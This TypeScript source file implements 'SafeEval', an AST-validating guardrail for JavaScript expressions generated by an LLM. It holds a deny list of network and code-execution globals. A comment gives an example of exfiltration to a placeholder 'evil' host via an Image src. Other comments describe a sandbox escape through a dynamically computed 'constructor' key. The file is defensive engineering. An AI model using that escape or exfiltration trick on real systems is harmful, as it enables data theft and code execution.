import * as acorn from "acorn";
import { containsAwait, extractScopeReads } from "./analyze";
import { isNode } from "./ast";

/**
 * SafeEval — a best-effort evaluator for small JavaScript expressions.
 *
 * Runs an expression against a provided context while shadowing ambient
 * globals, blocking statements / side-effects, and rejecting *static* access to
 * `constructor` / `__proto__` / `prototype`. Everything runs in the SAME realm,
 * so Proxy-based reactive state passed in the context works directly.
 *
 * IMPORTANT — this is a guardrail, NOT a containment boundary. Static AST
 * filtering cannot stop a determined adversary: a dynamically-computed property
 * key (e.g. `obj["con" + "structor"]`) reaches the `Function` constructor and
 * escapes every check here, the global shadowing included. Treat the expression
 * author as semi-trusted. To run genuinely untrusted / adversarial expressions,
 * isolate out-of-realm (Worker / iframe) or use SES. See
 * `../docs/EXPRESSIONS.md` → "Security — what this does and doesn't stop".
 *
 * @example
 *   const evaluator = new SafeEval();
 *   evaluator.eval("orders.filter(o => o.active).length", { orders: [] });
 */

// --- Globals to shadow ---
// We shadow these by declaring them as parameters set to `undefined`,
// so any reference inside the expression resolves to `undefined` instead
// of the real global.
const GLOBALS_TO_SHADOW = [
  // Global objects
  "globalThis",
  "self",
  "window",
  "global",
  "document",
  "navigator",
  "location",
  "history",
  "localStorage",
  "sessionStorage",
  "indexedDB",

  // Dangerous APIs
  "fetch",
  "XMLHttpRequest",
  "WebSocket",
  "EventSource",
  "Worker",
  "SharedWorker",
  "ServiceWorker",
  "importScripts",
  // Element constructors that fire a network request via `.src` — an
  // exfiltration channel even with fetch/XHR shadowed (e.g.
  // `new Image().src = "https://evil/?" + secret`).
  "Image",
  "Audio",

  // Code execution
  // NOTE: "eval" and "arguments" cannot be parameter names in strict mode.
  // They are blocked at the AST level instead (see FORBIDDEN_IDENTIFIERS).
  "Function",
  "WebAssembly", // WebAssembly.instantiate(bytes) runs arbitrary code
  "setTimeout",
  "setInterval",
  "setImmediate",
  "requestAnimationFrame",
  "requestIdleCallback",
  "queueMicrotask",

  // Process / non-browser runtimes
  "process",
  "require",
  "module",
  "exports",
  "__dirname",
  "__filename",
  "Buffer",
  "Deno", // runtime god-objects (fs / net / env) if evaluated outside a browser
  "Bun",

  // DOM
  "alert",
  "confirm",
  "prompt",
  "close",
  "open",
  "print",
  "postMessage",

  // Constructors that can escape
  "Proxy",
  "Reflect",
  "SharedArrayBuffer",
  "Atomics",
];

// --- Forbidden identifiers (can't be shadowed as params in strict mode) ---
const FORBIDDEN_IDENTIFIERS = new Set(["eval", "arguments"]);

// --- Forbidden AST node types ---
// Only expressions are allowed. These node types indicate statements,
// declarations, or other non-expression constructs.
const FORBIDDEN_NODE_TYPES = new Set([
  // Declarations
  "VariableDeclaration", // example: const x = 1
  "FunctionDeclaration", // example: function f() {}
  "ClassDeclaration", // example: class C {}
  "ImportDeclaration", // example: import x from "m"
  "ExportNamedDeclaration", // example: export { x }
  "ExportDefaultDeclaration", // example: export default x
  "ExportAllDeclaration", // example: export * from "m"

  // Statements
  "BlockStatement", // example: { doThing(); }
  "ExpressionStatement", // example: foo(); — top-level one handled specially
  "IfStatement", // example: if (a) b
  "SwitchStatement", // example: switch (x) { case 1: }
  "ForStatement", // example: for (;;) {}
  "ForInStatement", // example: for (k in o) {}
  "ForOfStatement", // example: for (v of xs) {}
  "WhileStatement", // example: while (a) {}
  "DoWhileStatement", // example: do {} while (a)
  "TryStatement", // example: try {} catch {}
  "ThrowStatement", // example: throw e
  "ReturnStatement", // example: return x
  "BreakStatement", // example: break
  "ContinueStatement", // example: continue
  "LabeledStatement", // example: loop: for (;;) {}
  "WithStatement", // example: with (o) {}
  "DebuggerStatement", // example: debugger
  "EmptyStatement", // example: ;

  // Other
  "SequenceExpression", // example: (a, b, c) — comma operator
  "AssignmentExpression", // example: a = b, a += b
  "UpdateExpression", // example: a++, --b
  "YieldExpression", // example: yield x
  "ImportExpression", // example: import("m") — dynamic import
  "MetaProperty", // example: import.meta, new.target
]);

// --- Node types allowed only inside function bodies ---
// A block-body arrow (or function expression) is itself a valid expression, so
// the statement constructs that can legally appear inside one are permitted
// *when nested in a function body* — never at the top level, where the
// element's `expr` must stay a single expression:
//   items.reduce((acc, item) => { const x = item.v; return acc + x; }, 0)
//
// This list is deliberately generous. The prompt steers the model toward simple
// expressions to save tokens, but the model is non-deterministic and will
// occasionally reach for `if` / `switch` / a loop anyway. Tolerating the
// safe-but-verbose forms turns a stylistic deviation into "works, just longer"
// rather than a hard render failure. It does NOT relax the security boundary:
// code execution, ambient globals, and prototype escapes stay blocked
// everywhere (see GLOBALS_TO_SHADOW / FORBIDDEN_PROPERTIES). The one thing AST
// validation can't bound is an infinite loop (`while (true) {}`) — expressions
// run in the viewer's own browser, so that's a runtime/timeout concern.
const ARROW_BODY_ALLOWED = new Set([
  // Local bindings + the block itself
  "BlockStatement", // example: => { ... }
  "ReturnStatement", // example: => { return x }
  "VariableDeclaration", // example: => { const x = 1; ... }
  "ExpressionStatement", // example: => { doThing(); ... }
  "AssignmentExpression", // example: => { acc.total += n; ... }
  "UpdateExpression", // example: => { for (let i = 0; i < n; i++) ... }
  // Conditionals
  "IfStatement", // example: => { if (a) return b; ... }
  "SwitchStatement", // example: => { switch (x) { case 1: return "a"; } }
  // Loops
  "ForStatement", // example: => { for (let i = 0; i < n; i++) { ... } }
  "ForOfStatement", // example: => { for (const x of xs) { ... } }
  "ForInStatement", // example: => { for (const k in obj) { ... } }
  "WhileStatement", // example: => { while (cond) { ... } }
  "DoWhileStatement", // example: => { do { ... } while (cond) }
  // Flow control inside the above
  "BreakStatement", // example: => { switch (x) { case 1: break; } }
  "ContinueStatement", // example: => { for (const x of xs) { if (!x) continue; } }
  // Defensive error handling
  "TryStatement", // example: => { try { return f() } catch { return null } }
  "ThrowStatement", // example: => { if (bad) throw new Error("x"); ... }
]);

// --- Forbidden property names accessed on any object ---
const FORBIDDEN_PROPERTIES = new Set([
  "constructor",
  "__proto__",
  "prototype",
  "__defineGetter__",
  "__defineSetter__",
  "__lookupGetter__",
  "__lookupSetter__",
]);

// --- AST Validation (the security boundary) ---
//
// `acorn.AnyNode` is the discriminated union `parse()` produces (narrowing on
// `.type`), `acorn.Program` is the parse result. The `isNode` guard (./ast) and
// the static analyzers — await / scope-read detection (./analyze) — are NOT
// security; this is the part that decides what may execute.
//
// KNOWN LIMITATION: the `constructor`/`__proto__`/`prototype` block below only
// catches *static* keys (dot access, or a string-literal computed key). A
// dynamically-computed key — `obj["con"+"structor"]`, `obj[`constructor`]`,
// `obj[["constructor"][0]]` — is undecidable here and reaches the real
// `Function` constructor at runtime, escaping the whole sandbox. We can't fix
// this statically without banning all computed access (`arr[i]`), which the
// language needs. See the class docstring + EXPRESSIONS.md for the threat model.

/**
 * Recursively walks the AST and throws if any forbidden node or
 * property access is found.
 */
function validateNode(
  node: acorn.AnyNode | null | undefined,
  isRoot = false,
  isPropertyName = false,
  insideFunctionBody = false,
): void {
  if (!node || typeof node !== "object") return;

  // Allow top-level ExpressionStatement (the wrapper acorn creates)
  // and Program, but nothing else from the forbidden set.
  if (node.type === "Program") {
    // Skip a leading "use strict" directive (validate() prepends one to force
    // strict-mode parsing, matching strict execution). Exactly one real
    // statement must remain: the wrapped expression.
    const statements = node.body.filter(
      (s) => !(s.type === "ExpressionStatement" && s.directive),
    );
    if (statements.length !== 1) {
      throw new SafeEvalError(
        `Expression must be a single expression, got ${statements.length} statements`,
      );
    }
    validateNode(statements[0], true);
    return;
  }

  if (node.type === "ExpressionStatement" && isRoot) {
    validateNode(node.expression);
    return;
  }

  if (FORBIDDEN_NODE_TYPES.has(node.type)) {
    if (!(insideFunctionBody && ARROW_BODY_ALLOWED.has(node.type))) {
      throw new SafeEvalError(
        `Forbidden syntax: "${node.type}" is not allowed in expressions`,
      );
    }
  }

  // Block tagged template literals - they can call arbitrary functions
  if (node.type === "TaggedTemplateExpression") {
    throw new SafeEvalError(
      "Tagged template literals are not allowed in expressions",
    );
  }

  // Check for property access to forbidden property names
  if (node.type === "MemberExpression" && !node.computed) {
    const prop = node.property;
    if (prop.type === "Identifier" && FORBIDDEN_PROPERTIES.has(prop.name)) {
      throw new SafeEvalError(`Access to "${prop.name}" is not allowed`);
    }
  }

  // Check computed property access with string literals like obj["constructor"]
  if (node.type === "MemberExpression" && node.computed) {
    const prop = node.property;
    if (
      prop.type === "Literal" &&
      typeof prop.value === "string" &&
      FORBIDDEN_PROPERTIES.has(prop.value)
    ) {
      throw new SafeEvalError(`Access to "${prop.value}" is not allowed`);
    }
  }

  // Block forbidden identifiers (eval, arguments) when used as
  // variable references - but allow them as property names (obj.eval is fine)
  if (
    node.type === "Identifier" &&
    !isPropertyName &&
    FORBIDDEN_IDENTIFIERS.has(node.name)
  ) {
    throw new SafeEvalError(`Access to "${node.name}" is not allowed`);
  }

  // Recurse into all child nodes. The union has no index signature, so index
  // the runtime shape; `isNode` filters out non-node fields (start/end/etc).
  const fields = node as unknown as Record<string, unknown>;
  for (const key of Object.keys(node)) {
    if (key === "type" || key === "start" || key === "end") continue;
    const child = fields[key];

    // Determine if this child is a non-computed property name
    const childIsPropertyName =
      node.type === "MemberExpression" && !node.computed && key === "property";

    // Track when we enter a function body (arrow or function expression) — the
    // statement constructs in ARROW_BODY_ALLOWED are legal inside either.
    const childInsideFunctionBody =
      insideFunctionBody ||
      ((node.type === "ArrowFunctionExpression" ||
        node.type === "FunctionExpression") &&
        key === "body");

    if (Array.isArray(child)) {
      for (const c of child) {
        if (isNode(c)) validateNode(c, false, false, childInsideFunctionBody);
      }
    } else if (isNode(child)) {
      validateNode(child, false, childIsPropertyName, childInsideFunctionBody);
    }
  }
}

// The AsyncFunction constructor — compiles expressions that contain `await`.
// Resolved once at module load via the prototype of an async function. (This
// `.constructor` read is our own module code, never sandboxed input.)
const AsyncFunction = Object.getPrototypeOf(async () => {})
  .constructor as typeof Function;

// --- Error class ---

export class SafeEvalError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "SafeEvalError";
  }
}

// --- SafeEval class ---

type CacheEntry = {
  isAsync: boolean;
  scopeReads: string[];
  // `fn` is lazily populated by `compile()` — `validate()` and `scopeReads()`
  // both fill the entry without paying the `new Function(...)` cost. The
  // first `compile()` (or `eval()`) call upgrades the entry with a real fn.
  fn?: (context: Record<string, unknown>) => unknown;
  // Per-context-shape compiled functions, keyed by the context-key signature.
  // `new Function(...)` depends only on the expression + the parameter names
  // (context keys ∪ shadow-params), so the same expression evaluated repeatedly
  // with the same context shape compiles once, not once per call.
  compiledBySig?: Map<string, (...args: unknown[]) => unknown>;
};

export class SafeEval {
  #cache = new Map<string, CacheEntry>();
  #maxCacheSize: number;
  #shadowParams: string[];

  constructor(
    options: {
      maxCacheSize?: number;
      extraGlobalsToShadow?: string[];
      allowGlobals?: string[];
    } = {},
  ) {
    const {
      maxCacheSize = 500,
      extraGlobalsToShadow = [],
      allowGlobals = [],
    } = options;

    this.#maxCacheSize = maxCacheSize;

    const allowSet = new Set(allowGlobals);
    this.#shadowParams = [...GLOBALS_TO_SHADOW, ...extraGlobalsToShadow].filter(
      (g) => !allowSet.has(g),
    );
  }

  /**
   * Validate an expression string without executing it.
   * Throws SafeEvalError if invalid.
   * Returns analysis output: `isAsync` (uses await) and `scopeReads`
   * (every `scopes.X.Y` path the expression reads, used by the renderer
   * to auto-subscribe to reactive deps so the LLM doesn't have to).
   *
   * Side effect: populates `#cache` with the analysis. The compiled
   * function isn't built until `compile()` / `eval()` is called.
   */
  validate(expression: string): { isAsync: boolean; scopeReads: string[] } {
    if (typeof expression !== "string") {
      throw new SafeEvalError("Expression must be a string");
    }

    const trimmed = expression.trim();
    if (!trimmed) {
      throw new SafeEvalError("Expression cannot be empty");
    }

    // Cache lookup happens upstream of parsing — analysis is stable per
    // expression string, so a second call is free.
    const cached = this.#cache.get(expression);
    if (cached) {
      return { isAsync: cached.isAsync, scopeReads: cached.scopeReads };
    }

    // Parse as a script containing `"use strict"; void (expr)`.
    // - `void (...)` forces expression context, so `{...}` is an object literal,
    //   not a block — matching how compile() wraps it as `return (expr)`.
    // - The leading `"use strict"` directive makes acorn parse in strict mode,
    //   matching strict execution: constructs that are sloppy-legal but
    //   strict-illegal (octal literals, `with`, duplicate params, …) are
    //   rejected here at validate time, instead of throwing raw at compile.
    const wrapper = `"use strict"; void (${trimmed})`;
    let ast: acorn.Program;
    try {
      ast = acorn.parse(wrapper, {
        ecmaVersion: 2022,
        sourceType: "script",
        allowAwaitOutsideFunction: true,
      });
    } catch (e: unknown) {
      throw new SafeEvalError(
        `Syntax error: ${e instanceof Error ? e.message : String(e)}. Expression: ${expression}`,
      );
    }

    // ast is Program > ExpressionStatement > UnaryExpression(void) > inner expression
    // Validate the entire tree (validateNode handles Program/ExpressionStatement)
    validateNode(ast);

    const analysis = {
      isAsync: containsAwait(ast),
      scopeReads: extractScopeReads(ast),
    };

    // Insert analysis into cache without a compiled fn — `compile()` will
    // upgrade lazily. Evict oldest first when full (insertion-order Map).
    if (this.#cache.size >= this.#maxCacheSize) {
      const firstKey = this.#cache.keys().next().value;
      if (firstKey !== undefined) this.#cache.delete(firstKey);
    }
    this.#cache.set(expression, { ...analysis });

    return analysis;
  }

  /**
   * Compile an expression into a reusable function.
   * If the expression uses `await`, the returned function will return a Promise.
   */
  compile(expression: string): (context: Record<string, unknown>) => unknown {
    // validate() populates the cache with the analysis (no `fn` yet) on the
    // first call, and is a cheap cache hit afterwards. So the entry is always
    // present below — we only need to attach the compiled `fn` lazily.
    const { isAsync } = this.validate(expression);
    const entry = this.#cache.get(expression);
    if (!entry) {
      // Unreachable: validate() just inserted this entry. Fail loud rather
      // than silently recompile with empty analysis.
      throw new SafeEvalError(
        `Cache entry missing for expression: ${expression}`,
      );
    }
    if (entry.fn) return entry.fn;

    const expr = expression.trim();
    const Ctor = isAsync ? AsyncFunction : Function;

    const evaluator = (context: Record<string, unknown>) => {
      const contextKeys = Object.keys(context);

      // The compiled function depends only on the expression and its parameter
      // names (context keys ∪ shadow-params), never on the argument *values* —
      // so memoize it by the context-key signature. The common case (the same
      // expression re-evaluated as state changes, with a stable context shape)
      // then pays `new Function(...)` once, not once per evaluation.
      const sig = contextKeys.join("\u0000");
      const compiledBySig = (entry.compiledBySig ??= new Map());
      let compiled = compiledBySig.get(sig);
      if (!compiled) {
        // Context keys become named params; shadow-params follow, bound to
        // `undefined`, so referencing a shadowed global yields undefined.
        const allParams = [...contextKeys, ...this.#shadowParams];
        try {
          compiled = new Ctor(...allParams, `"use strict"; return (${expr})`) as (
            ...args: unknown[]
          ) => unknown;
        } catch (e: unknown) {
          // validate() parses in strict mode, so this is rare — but a construct
          // that parses yet won't compile must surface as a SafeEvalError, not
          // a raw SyntaxError escaping from `new Function`.
          throw new SafeEvalError(
            `Failed to compile expression: ${
              e instanceof Error ? e.message : String(e)
            }. Expression: ${expression}`,
          );
        }
        compiledBySig.set(sig, compiled);
      }

      // Argument order matches `allParams`: context values (in `Object.keys`
      // order — the same order `sig` was built from) then the shadow fills.
      const allArgs = [
        ...Object.values(context),
        ...new Array(this.#shadowParams.length).fill(undefined),
      ];
      return compiled(...allArgs);
    };

    entry.fn = evaluator;
    return evaluator;
  }

  /**
   * Check whether a given expression uses `await` (and will therefore return a Promise).
   */
  isAsync(expression: string): boolean {
    const cached = this.#cache.get(expression);
    if (cached) return cached.isAsync;
    return this.validate(expression).isAsync;
  }

  /**
   * Return every `scopes.X.Y` path the expression reads. Used by the renderer
   * to auto-subscribe to reactive deps — the LLM no longer specifies a `deps`
   * array, this derives it from the expression text via static AST walk.
   *
   * - Stops at call-method segments (`.filter`, `.map`) — methods are not deps.
   * - Stops at computed keys (`scopes.x[i]` → `scopes.x` only; the index path
   *   `i` is walked recursively if it itself reads scopes).
   * - Returns the de-duplicated leaf paths in arbitrary order.
   */
  scopeReads(expression: string): string[] {
    const cached = this.#cache.get(expression);
    if (cached) return cached.scopeReads;
    return this.validate(expression).scopeReads;
  }

  /**
   * Evaluate an expression with the given context.
   */
  eval(expression: string, context: Record<string, unknown> = {}): unknown {
    const evaluator = this.compile(expression);
    return evaluator(context);
  }

  /**
   * Clear the expression cache.
   */
  clearCache(): void {
    this.#cache.clear();
  }
}

export default SafeEval;
